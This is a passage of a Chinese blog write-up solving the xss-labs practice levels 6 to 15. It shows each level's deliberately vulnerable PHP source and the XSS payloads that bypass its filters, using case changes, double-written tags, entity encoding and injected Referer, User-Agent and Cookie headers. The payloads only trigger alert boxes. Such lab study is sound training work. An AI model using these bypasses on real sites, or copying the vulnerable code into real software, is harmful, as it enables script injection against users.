class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&quot;&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191520214.png"></p></li></ul><h1 id="less-06"><a href="#less-06" class="headerlink" title="less-06"></a>less-06</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上一关的基础上,增加了更多替换,但是没有替换大小写</p></li><li><p>payload<br>使用大小写绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;Script&gt;alert(1);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191526138.png"></p></li></ul><h1 id="less-07"><a href="#less-07" class="headerlink" title="less-07"></a>less-07</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上一关的基础上替换为小写,无法使用大小写绕过,但是关键字替换为空</p><ul><li>payload<br>使用双写绕过<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191532406.png"></li></ul><h1 id="less-08"><a href="#less-08" class="headerlink" title="less-08"></a>less-08</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上一关的基础上,产生替换并且小写</p></li><li><p>payload<br>注入点产生在a标签,使用编码绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">unicode编码之后</span><br><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">120</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">41</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191547689.png"></p></li></ul><h1 id="less-09"><a href="#less-09" class="headerlink" title="less-09"></a>less-09</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上关的基础上校验是否带<code>http://</code>,不带则报错</p><ul><li>payload<br>依旧使用上关payload,在后面添加<a href="http://www.baidu.com,并使用//%E6%B3%A8%E9%87%8A%E6%8E%89">http://www.baidu.com,并使用//注释掉</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">120</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">39</span>;&amp;#<span class="number">41</span>;<span class="comment">//http://www.baidu.com</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191553544.png"></li></ul><h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>仅替换<code>&lt;</code> <code>&gt;</code>,但是输入框被隐藏了,需要修改</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;onmouseover=&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191618271.png"></p></li></ul><h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上一关的基础上增加了一个<code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code>被写入到第四个输入框也就是<code>$str33</code>且不存在过滤</p></li><li><p>payload<br>使用post发包,对referer进行修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onmouseover=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191626916.png"></p></li></ul><h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$str11</code>获取ua字段,并且对<code>&lt;&gt;</code>过滤,且隐藏输入框</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onmouseover=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191631713.png"></p></li></ul><h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上关的基础上,将ua修改为cookie</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onmouseover=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure></li></ul><h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>关卡不存在</p><h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 